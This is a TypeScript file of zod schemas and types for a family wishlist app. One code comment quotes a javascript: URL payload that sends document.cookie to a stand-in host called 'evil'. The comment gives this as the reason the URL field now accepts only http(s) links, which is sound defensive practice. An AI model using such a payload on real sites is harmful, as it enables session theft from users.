import { z } from 'zod'
import { zDateString, zHttpUrl, zId } from './common'

export const wishlistCreateSchema = z.object({
  title: z.string().trim().min(1).max(200),
  /** Free text — families invent occasions, so this is not an enum. */
  occasion: z.string().trim().max(100).nullish(),
  /** YYYY-MM-DD; drives the countdown. Never timezone-converted. */
  eventDate: zDateString.nullish(),
  /** Whose list it is. Defaults to the acting profile. */
  profileId: zId.optional(),
  sortOrder: z.number().int().min(0).max(10_000).optional(),
})

export const wishlistPatchSchema = wishlistCreateSchema.partial().extend({
  archived: z.boolean().optional(),
})

export const wishlistItemCreateSchema = z.object({
  name: z.string().trim().min(1).max(200),
  /**
   * Rendered as the item's link, so it must be a real http(s) address.
   * `z.string().url()` (what this used to be) happily accepts
   * `javascript:fetch('//evil/'+document.cookie)` — anyone in the household,
   * kids included, could store that and the next person to tap the item name
   * would run it on the board's origin with the session cookie.
   */
  url: zHttpUrl.max(2000).nullish(),
  notes: z.string().trim().max(2000).nullish(),
  /** Free text ("about $30", "£15-20") — a number would force a currency. */
  price: z.string().trim().max(50).nullish(),
  /** 0 = nice to have, 1 = would love, 2 = really wants. */
  priority: z.number().int().min(0).max(2).optional(),
  sortOrder: z.number().int().min(0).max(10_000).optional(),
})

export const wishlistItemPatchSchema = wishlistItemCreateSchema.partial()

export type WishlistCreate = z.infer<typeof wishlistCreateSchema>
export type WishlistPatch = z.infer<typeof wishlistPatchSchema>
export type WishlistItemCreate = z.infer<typeof wishlistItemCreateSchema>

export interface WishlistItemDto {
  id: string
  name: string
  url: string | null
  notes: string | null
  price: string | null
  priority: number
  sortOrder: number
}

export interface WishlistDto {
  id: string
  profileId: string
  profileName: string
  profileColor: string
  title: string
  occasion: string | null
  eventDate: string | null
  sortOrder: number
  itemCount: number
  items?: WishlistItemDto[]
}
